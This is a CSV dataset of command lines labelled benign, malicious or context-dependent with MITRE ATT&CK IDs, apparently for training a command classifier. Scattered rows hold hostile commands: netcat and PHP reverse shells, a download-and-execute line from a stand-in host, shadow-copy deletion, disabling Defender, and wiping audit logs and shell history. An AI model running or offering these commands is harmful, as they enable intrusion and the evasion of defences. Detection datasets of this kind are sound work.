command,label,original_label,mitre_id
timidity [--l|--loop] path/to/file.mid,Benign,Benign,Benign
go test -v -bench .,Benign,Benign,Benign
"echo ""$b"" | grep -o ""[$a]"" | tr -d '\n'",Benign,Benign,Benign
ftxdiff --include-unicode-names,Benign,Benign,Benign
mongodump [-u|--username] username database [-p|--password],Benign,Benign,Benign
float variable_name=value,Benign,Benign,Benign
kaggle [d|datasets] create [-p|--path] path/to/dataset [-u|--public],Benign,Benign,Benign
wezterm imgcat path/to/image,Benign,Benign,Benign
"loadtest --headers ""accept:text/plain;text-html"" https://example.com",Benign,Benign,Benign
slmgr.vbs /dli,Benign,Benign,Benign
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;,Malicious,Malicious,T1543
(find /boot | sed s'/^/STDOUT:/' ) 3>&1 1>&2 2>&3 | sed 's/^/STDERR:/',Benign,Benign,Benign
golangci-lint linters,Benign,Benign,Benign
slimrb --pretty input.slim output.html,Benign,Benign,Benign
Expand-Archive -Path path\to\example.zip -DestinationPath path\to\extracted_files -WhatIf,Benign,Benign,Benign
yay -Ss keyword,Benign,Benign,Benign
protonvpn connect server_name,Benign,Benign,Benign
"find /var/log/apache2/access*.gz -type f -newer ./tmpoldfile ! -newer ./tmpnewfile \ | xargs zcat | grep -E ""$MONTH\/$YEAR.*GET.*ad=$ADVERTISER HTTP\/1"" -c",Benign,Benign,Benign
find / -perm -644,Context_Dependent,Benign,Benign
sudo apptainer config fakeroot [-r|--remove] username,Benign,Benign,Benign
foot [-C|--check-config],Benign,Benign,Benign
readelf --symbols path/to/binary,Benign,Benign,Benign
k3s kubectl get nodes,Benign,Benign,Benign
mdbook clean,Benign,Benign,Benign
"find /var -maxdepth 2 -type d -exec stat -c ""%n %y"" {} \;",Benign,Benign,Benign
john --restore=path/to/mycrack.rec,Benign,Benign,Benign
virt-sparsify path/to/image --convert qcow2|raw|vdi|... path/to/new_image,Benign,Benign,Benign
meshlabserver -i input.stl -o output.obj,Benign,Benign,Benign
find / -type d -name 'httpdocs',Context_Dependent,Benign,Benign
"find . -type f -iname \*.mov -printf '%h\n' | sort | uniq | xargs -n 1 -d '\n' -I '{}' mkdir -vp ""/TARGET_FOLDER_ROOT/{}""",Benign,Benign,Benign
"echo ""error"" | tee",Benign,Benign,Benign
hashid [-o|--outfile] path/to/output.txt hash,Benign,Benign,Benign
iwconfig interface new_network_name,Benign,Benign,Benign
fortune,Benign,Benign,Benign
find . -type f -exec printf '%.0sbla\n' {} +,Benign,Benign,Benign
gnucash --nofile,Benign,Benign,Benign
"find ~/.personal/tips -type f -iname ""*.pdf"" -exec pdftotext '{}' - ';' | grep hot",Benign,Benign,Benign
sudo rm -rf bin/node bin/node-waf include/node lib/node lib/pkgconfig/nodejs.pc share/man/man1/node,Benign,Benign,Benign
fiascotopnm [-z|--fast] path/to/file.fiasco [-o|--output] output_file_basename,Benign,Benign,Benign
o [-m|-monitor] path/to/file,Benign,Benign,Benign
mlr --icsv --opprint cat example.csv,Benign,Benign,Benign
find /Users/Me/Desktop -user popo -perm 777,Benign,Benign,Benign
texcount -inc file.tex,Benign,Benign,Benign
npm-home [-y|--yarn] package,Benign,Benign,Benign
systemctl try-reload-or-restart unit,Benign,Benign,Benign
"find /var/log -name ""*.log"" -print0 2>/dev/null",Benign,Benign,Benign
git changelog --start-commit 0b97430 [-f|--final-tag] 1.0.0,Benign,Benign,Benign
wg genkey,Benign,Benign,Benign
systemd-analyze dot | dot -T svg > path/to/file.svg,Benign,Benign,Benign
"gemini [-i|--prompt-interactive] ""Give me an example of recursion in Python""",Benign,Benign,Benign
find . ! -user root,Benign,Benign,Benign
cancel,Benign,Benign,Benign
tree -L 2 -fi,Benign,Benign,Benign
foreman run command,Benign,Benign,Benign
"echo 'hello, world' | cat",Benign,Benign,Benign
/vmfs/volumes/,Malicious,Malicious,T1486
"Move-Item path\to\source_key1 , path\to\source_key2 ... path\to\new_or_existing_key",Benign,Benign,Benign
sudo cp $path_malicious_plist /tmp/T1037_005_daemon.plist,Malicious,Malicious,T1037
pixterm -s 2 path/to/file,Benign,Benign,Benign
play path/to/audio_file reverse,Benign,Benign,Benign
"find ./ -type f -name ""*.php"" | xargs -r rename ""s/php/html/""",Benign,Benign,Benign
byzanz-record [-v|--verbose] path/to/file.[byzanz|flv|gif|ogg|ogv|webm],Benign,Benign,Benign
herd start,Benign,Benign,Benign
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue,Malicious,Malicious,T1547
chage -l user,Context_Dependent,Synthetic,Synthetic
DescribeDBInstances,Context_Dependent,Malicious,T1580
inotifywait [-e|--event] modify path/to/file,Benign,Benign,Benign
npm org rm organization_name username,Benign,Benign,Benign
git tag --contains commit,Benign,Benign,Benign
jmtpfs [-l|--listDevices],Benign,Benign,Benign
palmtopnm [-t|-transparent] path/to/file.palm,Benign,Benign,Benign
find /some/path -type f ! -perm -111 -ls,Benign,Benign,Benign
emacsclient path/to/file,Benign,Benign,Benign
dnf versionlock delete package,Benign,Benign,Benign
find /path/to/dir -name '*.gz' -exec zgrep -- 'pattern' {} +,Benign,Benign,Benign
gawk '//' /path/to/input-file,Context_Dependent,Malicious,T1005
shasum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
lp path/to/file,Benign,Benign,Benign
reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,Malicious,Malicious,T1564
"sudo mount -i -o remount,suid /home/evgeny",Benign,Benign,Benign
rpk group describe group_name,Benign,Benign,Benign
ls -tp | grep -v '/$' | tail -n +6 | xargs -d '\n' rm --,Benign,Benign,Benign
npm unstar package_name --loglevel silent|error|warn|notice|http|timing|info|verbose|silly,Benign,Benign,Benign
if [ -d /var/audit ] ; then sudo rm -rf $macos_audit_path ; fi,Malicious,Malicious,T1070
gh issue view issue_number [-w|--web],Benign,Benign,Benign
sudo chown -R test /home/test,Benign,Benign,Benign
mdp [-t|--notrans] presentation.md,Benign,Benign,Benign
"Start-Process -Wait -FilePath ""$UltraViewer_Path"" -Argument ""/silent"" -PassThru",Malicious,Malicious,T1219
mcs -target:exe|winexe|library|module path/to/input_file1.cs path/to/input_file2.cs ...,Benign,Benign,Benign
"espeak ""text""",Benign,Benign,Benign
"C:\Windows\System32\inetsrv\appcmd.exe set config ""$website_name"" /section:httplogging /dontLog:true",Malicious,Malicious,T1562
snmpwalk [-h|--help],Benign,Benign,Benign
pm list packages -3,Benign,Benign,Benign
gendesk [-h|--help],Benign,Benign,Benign
find . -name '*.csv.gz' -exec gzip -d {} \;,Benign,Benign,Benign
whereis -u -m *,Context_Dependent,Benign,Benign
goenv exec go run go_version,Benign,Benign,Benign
find . -name modules,Benign,Benign,Benign
sonar-scanner [-D|--define] project.settings=myproject.properties,Benign,Benign,Benign
hexdump path/to/file,Benign,Benign,Benign
ibmcloud update -f,Benign,Benign,Benign
transmission-show [-s|--scrape] path/to/file.torrent,Benign,Benign,Benign
autoconf [-f|--force] [-o|--output] outfile template-file,Benign,Benign,Benign
find . -name '*.log' -type f -readable ! -size 0 -exec sed -n '1{/The SAS System/q0};q1' {} \; -print,Benign,Benign,Benign
"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi",Malicious,Malicious,T1562
az storage container delete --account-name storage_account_name [-n|--name] container_name --fail-not-exist,Benign,Benign,Benign
PATH %PATH%;path/to/directory,Benign,Benign,Benign
tldr argos-translate,Benign,Benign,Benign
"find . -name ""*.h"" -print | xargs wc -l",Benign,Benign,Benign
"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""$command_to_execute""),0)",Malicious,Malicious,T1218
pnmcolormap n_colors path/to/input.pnm > path/to/output.ppm,Benign,Benign,Benign
opencode uninstall [-h|--help],Benign,Benign,Benign
cat /etc/shells,Context_Dependent,Synthetic,Synthetic
"find -type f -name ""*.htm"" | sed 's@^./@@g;s@/@-@g' | awk -F'-' '{print $1 ""-"" $2 ""-"" $3 ""-"" substr($4, 5, 2) ""-"" $5}'",Benign,Benign,Benign
yacc -d path/to/grammar_file.y,Benign,Benign,Benign
x8 [-u|--url] https://example.com/?path=..%2faction.php%3f%s%23 --encode [-w|--wordlist] path/to/wordlist.txt,Benign,Benign,Benign
truncate [-s|--size] -2G path/to/file,Benign,Benign,Benign
oma help,Benign,Benign,Benign
"magick identify -format ""%f,%w,%h\n"" *.jpg > path/to/filelist.csv",Benign,Benign,Benign
"ls path/to/videos | mods [-f|--format] ""organize these by decade and summarize""",Benign,Benign,Benign
pnmindex [-s|-size] 50 path/to/input1.pnm path/to/input2.pnm ... > path/to/output.pnm,Benign,Benign,Benign
find . -exec $0 {} +,Benign,Benign,Benign
usql sqlserver|mysql|postgres|sqlite3|...://username:password@host:port/database_name,Benign,Benign,Benign
gh pr edit [-B|--base] branch_name,Benign,Benign,Benign
tldr magick import,Benign,Benign,Benign
nc -e /bin/sh 10.0.0.1 8080,Malicious,Synthetic,Synthetic
Install-NodeVersion node_version,Benign,Benign,Benign
systemctl service-log-target service_name syslog,Benign,Benign,Benign
<Ctrl t><q>,Benign,Benign,Benign
systemctl rescue,Benign,Benign,Benign
scutil --dns,Benign,Benign,Benign
find ~/ -name '*.txt' -exec cat {} ;,Benign,Benign,Benign
jj git init --colocate,Benign,Benign,Benign
es /a-d,Benign,Benign,Benign
dotty -lm sync|async path/to/graph.gv,Benign,Benign,Benign
ppmhist [-v|-version],Benign,Benign,Benign
"xxh ""host"" ++host-xxh-home ~/.xxh",Benign,Benign,Benign
sudo pacsync --updated,Benign,Benign,Benign
ssh user@host -S /tmp/%r@%h:%p,Benign,Benign,Benign
installer -dominfo [-pkg|-package] path/to/package.pkg,Benign,Benign,Benign
gitwatch -r remote_name -b branch_name path/to/file_or_directory,Benign,Benign,Benign
bc --expression '5 / 3',Benign,Benign,Benign
"rsync -a -f""+ */"" -f""- *"" source/ destination/",Benign,Benign,Benign
systemd-cryptsetup attach mapping_name /dev/sdXY path/to/keyfile crypttab_options,Benign,Benign,Benign
g++ path/to/source.cpp -std=c++98|c++11|c++14|c++17 [-o|--output] path/to/output_executable,Benign,Benign,Benign
"export PS1=""\[\033]0;\u $(host $(hostname))\007\]\u@\h:\w\$ """,Benign,Benign,Benign
gacutil -l,Benign,Benign,Benign
id -un,Context_Dependent,Synthetic,Synthetic
shopt -s nullglob dotglob,Benign,Benign,Benign
tldr vim,Benign,Benign,Benign
jj config [l|list] name,Benign,Benign,Benign
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,Malicious,Malicious,T1222
command 2> /dev/null,Benign,Benign,Benign
firewall-cmd --list-all-zones,Benign,Benign,Benign
wondershaper -c -a adapter_name,Benign,Benign,Benign
googler --json keyword,Benign,Benign,Benign
cat /etc/pam.d/passwd,Context_Dependent,Malicious,T1201
runcon [-t|--type] domain_t command,Benign,Benign,Benign
base32 [-d|--decode] path/to/file,Benign,Benign,Benign
cat file.json | jtbl,Benign,Benign,Benign
mcookie [-v|--verbose],Benign,Benign,Benign
fileicon test path/to/file_or_directory,Benign,Benign,Benign
pkgfile filename,Benign,Benign,Benign
ld.so,Malicious,Malicious,T1574
"az cognitiveservices account commitment-plan create [-n|--name] account_name [-g|--resource-group] resource_group --commitment-plan-name ""plan_name"" --hosting-model ""hosting_model"" --plan-type ""plan_type"" --auto-renew false|true",Benign,Benign,Benign
blender [-b|--background] path/to/file.blend --python-expr 'import bpy; bpy.data.scenes[0].render.resolution_percentage = 25' [-a|--render-anim],Benign,Benign,Benign
/run/shm,Malicious,Malicious,T1027
sshuttle --dns [-r|--remote] username@sshserver 0.0.0.0/0,Benign,Benign,Benign
toybox command --help,Benign,Benign,Benign
"php -r '$sock=fsockopen(""192.168.1.100"",9001);exec(""/bin/sh -i <&3 >&3 2>&3"")'",Malicious,Synthetic,Synthetic
pamflip [-r|-rotate]90|180|270 path/to/input.pam > path/to/output.pam,Benign,Benign,Benign
acountry -v example.com,Benign,Benign,Benign
komac [complete|autocomplete] bash|elvish|fish|powershell|zsh,Benign,Benign,Benign
find /home/test -name '.ssh',Context_Dependent,Benign,Benign
conda info [-s|--system],Benign,Benign,Benign
xdg-desktop-menu install path/to/file.desktop,Benign,Benign,Benign
ss-local -s host -p server_port -l local port -k password -m encrypt_method,Context_Dependent,Benign,Benign
bun test path/to/file.test.ts,Benign,Benign,Benign
nmcli [n|networking] [c|connectivity],Benign,Benign,Benign
e2image -Q /dev/sdXN path/to/image_file,Benign,Benign,Benign
find /Users/david/Desktop -type f \( -name '*.txt' -o -name '*.mpg' -o -name '*.jpg' \),Benign,Benign,Benign
"find ./ -name ""*"" | xargs grep ""searchName""",Benign,Benign,Benign
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337,Malicious,Malicious,T1539
uv build,Benign,Benign,Benign
vulkaninfo,Benign,Benign,Benign
npm whoami,Benign,Benign,Benign
"todoist [a|add] ""task_name"" --priority 1 --label-ids ""label_id"" --project-name ""project_name"" --date ""tmr 9am""",Benign,Benign,Benign
stat /etc/crontab,Context_Dependent,Synthetic,Synthetic
bluebuild build path/to/recipe.yml,Benign,Benign,Benign
sfdk -c 'target=SailfishOS-5.0.0.62-armv7hl' build-shell --maintain ssu lr,Benign,Benign,Benign
lit path/to/test_file.test,Benign,Benign,Benign
torsocks --shell,Benign,Benign,Benign
xrandr --auto,Benign,Benign,Benign
pstree -u,Context_Dependent,Synthetic,Synthetic
find debian/fglrx/ -name 'fglrx-libglx*',Benign,Benign,Benign
"net group ""$group"" ""$username"" /add /domain",Malicious,Malicious,T1136
rustdoc src/lib.rs --out-dir path/to/output_directory,Benign,Benign,Benign
spctl --add --label rule_name path/to/file,Benign,Benign,Benign
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},Malicious,Malicious,T1490
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},Malicious,Malicious,T1567
ldapsearch [-D|--bindDN] 'admin_DN' [-w|--bindPassword] 'password' [-h|--hostname] ldap_host '(|(memberOf=group1)(memberOf=group1)(memberOf=group3))' displayName,Benign,Benign,Benign
"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C x",Malicious,Malicious,T1059
systemd-socket-activate path/to/socket.socket path/to/service.service,Benign,Benign,Benign
"openstack port create --network network_id --fixed-ip subnet=subnet_id,ip-address=192.168.1.50 port_name",Benign,Benign,Benign
sambaPipe.py -so path/to/file.so -k -no-pass domain/username:password@target,Benign,Benign,Benign
pve-firewall [l|localnet],Benign,Benign,Benign
linkchecker --ignore-url regex https://example.com/,Benign,Benign,Benign
matlab -nodisplay,Benign,Benign,Benign
mongorestore --db database_name path/to/directory,Benign,Benign,Benign
bun pm hash-print,Benign,Benign,Benign
netsh wlan show profile * key=clear,Context_Dependent,Malicious,T1016
sudo tlmgr remove package,Benign,Benign,Benign
swift $swift_src -keylog,Malicious,Malicious,T1056
k8sec dump [-f|--filename] path/to/file secret_name,Benign,Benign,Benign
"sudo nmap -T0 -D decoy_ip1,decoy_ip2,... --source-port 53 -f --data-length 16 -Pn ip_or_host",Benign,Benign,Benign
clang path/to/source.c [-o|--output] path/to/output_executable -Ipath/to/header -Lpath/to/library -llibrary_name,Benign,Benign,Benign
find . -maxdepth 1 -type d -empty -exec rm {} \;,Benign,Benign,Benign
kubectl replace [-f|--filename] -,Benign,Benign,Benign
pdftoppm -mono path/to/file.pdf image_name_prefix,Benign,Benign,Benign
doctl [a|apps] [cd|create-deployment] app_id,Benign,Benign,Benign
uncompress -c path/to/file1.Z path/to/file2.Z ...,Benign,Benign,Benign
sattach --input-filter task_number,Benign,Benign,Benign
glib-compile-resources --generate-dependencies file.gresource.xml,Benign,Benign,Benign
nimble install package,Benign,Benign,Benign
tldr traceroute,Benign,Benign,Benign
keepass2 path/to/database.kbdx -keyfile:path/to/key_file.key,Benign,Benign,Benign
set -e,Benign,Benign,Benign
mmdc [-i|--input] input.mmd [-o|--output] output.svg [-b|--backgroundColor] color,Benign,Benign,Benign
eza [-lT|--long --tree] [-L|--level] 3,Benign,Benign,Benign
crond -s,Benign,Benign,Benign
uwfmgr file commit drive_letter:\path\to\file,Benign,Benign,Benign
goaccess path/to/logfile --log-format=format,Benign,Benign,Benign
curlie post httpbin.org/post name=john age:=25,Benign,Benign,Benign
agetty [-n|--skip-login] [-l|--login-program] login_program tty,Benign,Benign,Benign
"diff -rq /dir1 /dir2 | grep -E ""^Only in /dir1.*"" | sed -n 's/://p' | awk '{print $3""/""$4}' xargs -I {} rm -r {}",Benign,Benign,Benign
rev test.txt | sort -k2 | rev,Benign,Benign,Benign
GetIpAddrTable,Context_Dependent,Malicious,T1016
pio check [-d|--project-dir] project_directory,Benign,Benign,Benign
strip-nondeterminism --timestamp unix_timestamp path/to/file,Benign,Benign,Benign
drill mx example.com,Benign,Benign,Benign
gopass sync,Benign,Benign,Benign
"$ShortCut.Description = ""T1547.009."";",Malicious,Malicious,T1547
sudo airodump-ng interface,Benign,Benign,Benign
find / -type d -print,Context_Dependent,Benign,Benign
gofmt -e source.go,Benign,Benign,Benign
trafilatura [-h|--help],Benign,Benign,Benign
find . -maxdepth 1 -type d -empty,Benign,Benign,Benign
"find temp/medium/* -maxdepth 2 -iname ""*.jpg"" -print0 | xargs -0 mogrify -resize 428x270""^"" -quality 80 -compress JPEG -monitor -strip",Benign,Benign,Benign
find . -print -exec touch {} \;,Benign,Benign,Benign
stat /etc/pam.d/common-auth,Context_Dependent,Synthetic,Synthetic
yazi,Benign,Benign,Benign
sgitopnm [-verb|-verbose] path/to/input.sgi > path/to/output.pnm,Benign,Benign,Benign
gnome-screenshot [-f|--file] path/to/file,Benign,Benign,Benign
rga --rga-list-adapters,Benign,Benign,Benign
sfdk cmake --build .,Benign,Benign,Benign
streamlit run project_name,Benign,Benign,Benign
"& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n $process_name",Malicious,Malicious,T1562
"sshpass -p ""YOUR_PASSWORD"" ssh -o StrictHostKeyChecking=no YOUR_USERNAME@SOME_SITE.COM",Benign,Benign,Benign
"flake8 --exclude substring1,glob2 path/to/file_or_directory",Benign,Benign,Benign
apptainer build --disable-cache path/to/image.sif docker://image:tag,Benign,Benign,Benign
git cherry-pick [-n|--no-commit] commit,Benign,Benign,Benign
mosh --server=path/to/mosh-server remote_host,Benign,Benign,Benign
"for f in `find -name \*.jsp` ; do echo ""==> $f"" >> out.txt ; grep ""TODO"" $f >> out.txt ; done",Benign,Benign,Benign
echo 'some_file_name' | cpio -p --owner someuser:somegroup destination_directory,Benign,Benign,Benign
"find . -name ""*~"" -exec rm {} \;",Benign,Benign,Benign
"echo ""a,b, c"" | tuc [-e|--regex] '[, ]+' [-f|--fields] 1,3",Benign,Benign,Benign
GetKeyboardLayoutList,Context_Dependent,Malicious,T1614
terraform apply -auto-approve,Benign,Benign,Benign
OpenEventLogW,Malicious,Malicious,T1070
m disk filesystems,Benign,Benign,Benign
find . -perm 0777 -type f -exec ls -l {} \;,Benign,Benign,Benign
"lxc profile assign container_name profile1,profile2",Benign,Benign,Benign
spark new project_name,Benign,Benign,Benign
"Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"" -Destination ""C:\Windows\System32""",Malicious,Malicious,T1003
polybar --reload bar_name,Benign,Benign,Benign
"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",Context_Dependent,Malicious,T1518
vidir,Benign,Benign,Benign
plasma-apply-lookandfeel --help,Benign,Benign,Benign
"for variable in item1 item2 ...; do echo ""Loop is executed""; done",Benign,Benign,Benign
prowler aws [-s|--services] s3|ec2|...,Benign,Benign,Benign
find . -name '*.js',Benign,Benign,Benign
git fast-export --progress n --all > path/to/file,Benign,Benign,Benign
"find . -wholename \*.mbox | awk '{new=$0; gsub(""\.mbox$"", """", new) ; system(""mv \"""" $0 ""\"" \"""" new ""\"""") }'",Benign,Benign,Benign
wget -q http://update.bad/payload -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden,Malicious,Synthetic,Synthetic
%APPDATA%\..\Local Settings\Temporary Internet Files\Content.Word\,Malicious,Malicious,T1070
apptainer exec --nv path/to/image.sif command,Benign,Benign,Benign
"yt-dlp [-I|--playlist-items] 2,4:6,-1 ""https://youtube.com/playlist?list=PLbzoR-pLrL6pTJfLQ3UwtB-3V4fimdqnA""",Benign,Benign,Benign
"find . -type f | xargs grep -l ""search-pattern""",Benign,Benign,Benign
hcitool lp,Benign,Benign,Benign
atuin sync,Benign,Benign,Benign
ruby -I path/to/library_folder -r library_require_name path/to/bin_folder/bin_name,Benign,Benign,Benign
pkgdiff path/to/package1.txz path/to/package2.txz,Benign,Benign,Benign
gpupdate,Benign,Benign,Benign
light-arionum-cli send address value optional_message,Benign,Benign,Benign
git magic,Benign,Benign,Benign
wakeonlan 01:02:03:04:05:06,Benign,Benign,Benign
oc get pods,Benign,Benign,Benign
exo compute instance scale instance_name|id instance_type,Benign,Benign,Benign
"ping 8.8.8.8 | awk '{split($7,a,""[=.]"");if (a[2]>58) print a[2], strftime()}'",Benign,Benign,Benign
gdalinfo WMS:https://services.meggsimum.de/geoserver/ows,Benign,Benign,Benign
sudo synopkg uninstall package,Benign,Benign,Benign
fg,Benign,Benign,Benign
python -c 'import sys; from os import environ as e,Malicious,Malicious,T1105
find -L .,Benign,Benign,Benign
pixi global install package1 package2 ...,Benign,Benign,Benign
cheatshh [-dc|--delete-command],Benign,Benign,Benign
ffuf -w path/to/wordlist -x http://127.0.0.1:8080 -u https://example.com/FUZZ,Benign,Benign,Benign
kubectl wait --for condition=complete job/job_name --timeout 120s,Benign,Benign,Benign
sfdk engine start,Benign,Benign,Benign
mh_metric --octave path/to/file1.m path/to/file2.m ...,Benign,Benign,Benign
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore",Malicious,Malicious,T1562
gh gpg-key delete key_id,Benign,Benign,Benign
"regsvr32 /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll""",Malicious,Malicious,T1564
fonttools subset path/to/font.ttf --unicodes=U+0000-007F,Benign,Benign,Benign
rabbitmqctl [-n|--node] nodename stop_app,Benign,Benign,Benign
spi search_terms,Benign,Benign,Benign
tune.exfat [-I|--set-serial] new_serial /dev/sdXY,Benign,Benign,Benign
pw-dot [-r|--remote] remote_name [-s|--smart],Benign,Benign,Benign
"tuckr add \* -e program1,program2",Benign,Benign,Benign
"find /home/vmail/ -type d -path ""*/*/Maildir/.LearnAsHam/cur"" -exec sh -c '(cd {} && mv ./* ../../.Inbox/cur)' ';'",Context_Dependent,Benign,Benign
nvtop [-v|--version],Benign,Benign,Benign
find /etc -name '*.conf' -type f,Context_Dependent,Synthetic,Synthetic
asciiart [-i|--invert-chars] path/to/image.jpg,Benign,Benign,Benign
aws s3 rm s3://bucket_name/path/to/file,Benign,Benign,Benign
find -iname pattern,Benign,Benign,Benign
Actual: $ActualOutput,Malicious,Malicious,T1218
openstack subnet list,Benign,Benign,Benign
sudo tlp-stat [-t|--temp],Benign,Benign,Benign
choco feature disable --name name,Benign,Benign,Benign
Remove-Variable xlApp,Malicious,Malicious,T1204
sudo pacman -U --overwrite path/to/file path/to/package.pkg.tar.zst,Benign,Benign,Benign
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -SimulateUserDoubleClick,Malicious,Malicious,T1218
astronomer tldr-pages/tldr-node-client,Benign,Benign,Benign
loadkeys [-p|--parse] en|de|fi|...,Benign,Benign,Benign
distrobox-export [-b|--bin] path/to/binary [-ep|--export-path] path/to/binary_on_host,Benign,Benign,Benign
sudo paclock --unlock,Benign,Benign,Benign
nagios2 -v,Benign,Benign,Benign
"Stop-Service -DisplayName ""name""",Benign,Benign,Benign
"ln -s ""../config/environments""",Benign,Benign,Benign
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null,Malicious,Malicious,T1204
hg serve [-p|--port] port,Benign,Benign,Benign
tex -halt-on-error source.tex,Benign,Benign,Benign
systemd-cgls [-u|--unit] unit1 unit2 ...,Benign,Benign,Benign
printenv [-0|--null] HOME,Benign,Benign,Benign
find . -perm 644 -type f -exec ls -l {} \;,Benign,Benign,Benign
"mimikatz ""privilege::whoami""",Benign,Benign,Benign
find ~/junk -name 'cart[1-6]' -exec ls -l {} \; 2> /dev/null,Benign,Benign,Benign
LVM_SETITEMPOSITION,Malicious,Malicious,T1055
mole status,Benign,Benign,Benign
$requiredGraphAccess.ResourceAppId = $graphSP.AppId,Malicious,Malicious,T1098
pwgen [-s|--secure],Benign,Benign,Benign
act push [-W|--workflows] path/to/workflow,Benign,Benign,Benign
cmd /c c:\temp\PsExec.exe -accepteula -j -d -s [Target Binary],Malicious,Malicious,T1569
ikaros install device,Benign,Benign,Benign
swaylock [-u|--no-unlock-indicator],Benign,Benign,Benign
git bundle create path/to/file.bundle -5 HEAD,Benign,Benign,Benign
direnv deny .,Benign,Benign,Benign
cmctl check api,Benign,Benign,Benign
LastAccessTime,Malicious,Malicious,T1070
updatectl list target,Benign,Benign,Benign
systemd-nspawn [-D|--directory] path/to/container_root [-a|--as-pid2],Benign,Benign,Benign
find /usr -maxdepth 1 -print,Benign,Benign,Benign
dc,Benign,Benign,Benign
DisplayName = $p.DisplayName,Context_Dependent,Malicious,T1007
"krunvm create docker.io/fedora --cpus number_of_vcpus --mem memory_in_megabytes --name ""name""",Benign,Benign,Benign
fswatch --event Updated|Removed|Created|... path/to/directory | xargs [-n|--max-args] 1 bash_command,Benign,Benign,Benign
bmaptool copy --bmap blockmap.bmap source.img.gz /dev/sdb,Benign,Benign,Benign
"""$uacme_exe""",Malicious,Malicious,T1548
comm -1 -3 file1 file2,Benign,Benign,Benign
qm set 100 --cores 4,Benign,Benign,Benign
systemsettings [-h|--help],Benign,Benign,Benign
tldr trunk.io,Benign,Benign,Benign
svccfg export servicename > path/to/smf_file.xml,Benign,Benign,Benign
navi fn welcome,Benign,Benign,Benign
"espeak-ng -s speed -p pitch ""text""",Benign,Benign,Benign
pdfgrep [-H|--with-filename] [-n|--page-number] pattern file.pdf,Benign,Benign,Benign
kubectl cluster-info dump,Context_Dependent,Benign,Benign
npm token list,Benign,Benign,Benign
cat file | xclip -selection clipboard,Benign,Benign,Benign
waypipe --test-skip-vulkan ssh user@server program,Benign,Benign,Benign
"topydo add ""todo_message due:fri""",Benign,Benign,Benign
powerSQL -noninteractive -consoleoutput,Context_Dependent,Malicious,T1518
"nl -b a file | sort -k1,1nr | sed '1, 4 d' | sort -k1,1n | sed 's/^ *[0-9]*\t//'",Benign,Benign,Benign
rexec [-n|--noerr] [-h|--host] remote_host ls -l,Benign,Benign,Benign
"find . ! -name . -prune -exec sh -c 'shift $1; mv ""$@"" targetdirectory/' 2 1 {} +",Benign,Benign,Benign
git rebase-patch patch_file,Benign,Benign,Benign
SafeEjectGPU Eject,Benign,Benign,Benign
xsel [-ob|--output --clipboard],Benign,Benign,Benign
cat myfile,Benign,Benign,Benign
blkdiscard [-l|--length] 100MB /dev/device,Benign,Benign,Benign
getconf -a,Benign,Benign,Benign
find /var/lib -name '.env' -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
